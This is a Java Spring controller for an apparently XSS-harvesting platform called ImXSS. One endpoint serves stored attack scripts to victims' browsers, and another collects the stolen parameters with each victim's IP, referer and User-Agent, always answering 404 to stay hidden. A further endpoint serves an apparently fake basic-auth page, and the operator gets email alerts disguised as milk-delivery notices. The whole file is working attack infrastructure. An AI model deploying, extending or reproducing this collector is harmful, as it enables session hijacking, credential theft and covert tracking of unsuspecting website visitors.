package com.imxss.web.controller.xss;

import java.text.MessageFormat;
import java.util.Date;
import java.util.List;
import java.util.Map;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.coody.framework.context.annotation.LogHead;
import org.coody.framework.core.controller.BaseController;
import org.coody.framework.core.thread.XssThreadHandle;
import org.coody.framework.util.EncryptUtil;
import org.coody.framework.util.PrintException;
import org.coody.framework.util.RequestUtil;
import org.coody.framework.util.StringUtil;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;

import com.imxss.web.domain.EmailSendCensus;
import com.imxss.web.domain.LetterInfo;
import com.imxss.web.domain.LetterParas;
import com.imxss.web.domain.ModuleInfo;
import com.imxss.web.domain.ProjectInfo;
import com.imxss.web.domain.ProjectModuleMapping;
import com.imxss.web.domain.UserInfo;
import com.imxss.web.service.EmailService;
import com.imxss.web.service.IpService;
import com.imxss.web.service.LetterService;
import com.imxss.web.service.ModuleService;
import com.imxss.web.service.ProjectService;
import com.imxss.web.service.SuffixService;
import com.imxss.web.service.UserService;

@Controller
@RequestMapping("/s")
public class XssController extends BaseController {

	@Resource
	ProjectService projectService;
	@Resource
	ModuleService moduleService;
	@Resource
	SuffixService suffixService;
	@Resource
	LetterService letterService;
	@Resource
	IpService ipService;
	@Resource
	UserService userService;
	@Resource
	EmailService emailService;

	@RequestMapping(value = { "/{id:\\d+}" })
	public void xssContext(HttpServletRequest req, HttpServletResponse res, @PathVariable Integer id) {
		ProjectInfo project = projectService.loadProjectInfo(id);
		if (StringUtil.isNullOrEmpty(project) || StringUtil.isNullOrEmpty(project.getModuleId())) {
			return;
		}
		if(project.getIsOpen()!=1){
			logger.info("该项目已终止收信:" + id);
			return;
		}
		// 匹配来源地址
		Integer moduleId = project.getModuleId();
		String referer = req.getHeader("Referer");
		List<ProjectModuleMapping> mappings = projectService.loadProjectMappings(id);
		if (!StringUtil.isNullOrEmpty(mappings)) {
			String ip = RequestUtil.getIpAddr(req);
			for (ProjectModuleMapping mapping : mappings) {
				if (mapping.getType() == 1) {
					logger.debug("来源地址:" + referer + ";匹配URL:" + mapping.getMapping());
					if (StringUtil.isAntMatch(referer, mapping.getMapping())) {
						moduleId = mapping.getModuleId();
						logger.debug("匹配模板:" + moduleId);
						continue;
					}
					continue;
				}
				logger.debug("IP地址:" + referer + ";匹配IP:" + mapping.getMapping());
				if (StringUtil.isAntMatch(ip, mapping.getMapping())) {
					moduleId = mapping.getModuleId();
					logger.debug("匹配模板:" + moduleId);
					continue;
				}

			}
		}
		setSessionPara("moduleId", moduleId);
		ModuleInfo module = moduleService.loadModuleInfo(moduleId);
		if (StringUtil.isNullOrEmpty(module)) {
			return;
		}
		String api = loadBasePath(req) + "s/" + "api_" + project.getId() + "."
				+ suffixService.loadSpringDefaultSuffix();
		String xmlCode= module.getContent();
		xmlCode = xmlCode.replace("{api}", api);
		xmlCode = xmlCode.replace("{basePath}", getAttribute("basePath").toString());
		xmlCode = xmlCode.replace("{projectId}", id.toString());
		xmlCode = xmlCode.replace("{moduleId}", moduleId.toString());
		xmlCode = xmlCode.replace("{defSuffix}",RequestUtil.loadBasePath(req));
		try {
			res.getWriter().write(xmlCode);
		} catch (Exception e) {
		}
	}
	

	@RequestMapping(value = { "auth_{projectId:\\d+}_{moduleId:\\d+}" })
	@LogHead("基础认证")
	public String auth(HttpServletRequest req, HttpServletResponse res, @PathVariable Integer projectId, @PathVariable Integer moduleId) {
		String referer=(String)request.getSession().getAttribute("referer");
		if (StringUtil.isNullOrEmpty(referer)) {
			referer=StringUtil.isNullOrEmpty(req.getHeader("Referer"))?req.getHeader("referer"):req.getHeader("Referer");
			request.getSession().setAttribute("referer", referer);
		}
		setAttribute("moduleId", moduleId);
		setAttribute("projectId", moduleId);
		setAttribute("referer", referer);
		return "auth";
	}

	@RequestMapping(value = { "api_{id:\\d+}" })
	@LogHead("接受信封")
	public void api(HttpServletRequest req, HttpServletResponse res, @PathVariable Integer id) {
		try {
			ProjectInfo project = projectService.loadProjectInfo(id);
			if(project.getIsOpen()!=1){
				logger.error("该项目已终止收信:" + id);
				return;
			}
			Map<String, String> paraMap = getParas();
			if (StringUtil.isNullOrEmpty(paraMap)) {
				logger.error("未接受任何参数:" + id);
				return;
			}
			paraMap.put("User-Agent", req.getHeader("User-Agent"));
			String referer = StringUtil.isNullOrEmpty(req.getHeader("Referer"))?req.getHeader("referer"):req.getHeader("Referer");
			String basePath = RequestUtil.loadBasePath(req);
			String ip = RequestUtil.getIpAddr(req);
			Integer moduleId = getSessionPara("moduleId");
			XssThreadHandle.xssThreadPool.execute(new Runnable() {
				@Override
				public void run() {
					doApi(project, referer, paraMap, basePath, ip, moduleId);
				}
			});
		} catch (Exception e) {
			PrintException.printException(logger, e);
		} finally {
			res.setStatus(404);
		}
	}

	public void doApi(Integer projectId, String referer, Map<String, String> paraMap, String basePath, String ip,
			Integer moduleId) {
		ProjectInfo project = projectService.loadProjectInfo(projectId);
		if(project.getIsOpen()!=1){
			logger.error("该项目已终止收信:" + projectId);
			return;
		}
		if (StringUtil.isNullOrEmpty(paraMap)) {
			logger.error("未接受任何参数:" + projectId);
			return;
		}
		doApi(project, referer, paraMap, basePath, ip, moduleId);
	}
	public void doApi(ProjectInfo project, String referer, Map<String, String> paraMap, String basePath, String ip,
			Integer moduleId) {

		try {
			// 过滤来源地址
			if (!StringUtil.isNullOrEmpty(project.getIgnoreRef())) {
				String[] pattens = project.getIgnoreRef().split(" ");
				for (String patten : pattens) {
					if (!StringUtil.isAntMatch(referer, patten)) {
						continue;
					}
					logger.error("来源地址已过滤:" + referer + ";" + patten);
					return;
				}
			}
			// 过滤IP地址
			if (!StringUtil.isNullOrEmpty(project.getIgnoreIp())) {
				String[] pattens = project.getIgnoreIp().split(" ");
				for (String patten : pattens) {
					if (!StringUtil.isAntMatch(ip, patten)) {
						continue;
					}
					logger.error("IP地址已过滤:" + ip + ";" + patten);
					return;
				}
			}
			// 检查信封重复
			String unionId = EncryptUtil.md5Code(paraMap.toString());
			LetterInfo letter = letterService.loadLetterInfo(unionId);
			if (letter != null) {
				logger.error("信封已存在:" + referer + ";" + project.getId() + ";" + unionId);
				return;
			}
			letter = new LetterInfo();
			letter.setProjectId(project.getId());
			letter.setRefUrl(referer);
			letter.setUpdateTime(new Date());
			letter.setIp(ip);
			letter.setIsReaded(0);
			letter.setRefUrl(referer);
			letter.setUnionId(unionId);
			letter.setUserId(project.getUserId());
			letter.setModuleId(moduleId);
			Integer letterId = letterService.writeLetterInfo(letter).intValue();
			if (letterId < 1) {
				logger.error("信封写入失败:" + letter);
				return;
			}
			for (String key : paraMap.keySet()) {
				try {
					LetterParas para = new LetterParas();
					para.setParaName(key);
					para.setParaValue(paraMap.get(key));
					para.setUpdateTime(new Date());
					para.setLetterId(letterId);
					letterService.writeLetterParas(para);
				} catch (Exception e) {
					// TODO: handle exception
				}
			}
			// 初始化IP地址信息
			ipService.loadIpInfo(ip);
			// 发送邮件
			if (project.getOpenEmail() == null || project.getOpenEmail() != 1) {
				return;
			}
			UserInfo userInfo = userService.loadUserInfo(project.getUserId());
			if (userInfo == null) {
				return;
			}
			EmailSendCensus census= emailService.getSendCensus(project.getUserId());
			if(census!=null) {
				if(census.getNum()>100) {
					logger.error("本日发送次数已达上限，用户ID："+project.getUserId());
					return;
				}
			}
			emailService.pushSendNum(project.getUserId());
			String context = MessageFormat.format("商品来源:{0}\r\n商家身份:{1}\r\n\r\n您购买的牛奶已经到货,请登录http:{2} 查看", referer, ip,
					basePath);
			emailService.sendEmailAuto("ImXSS", context, userInfo.getEmail());
			return;
		} catch (Exception e) {
			PrintException.printException(logger, e);
		}
	}
}
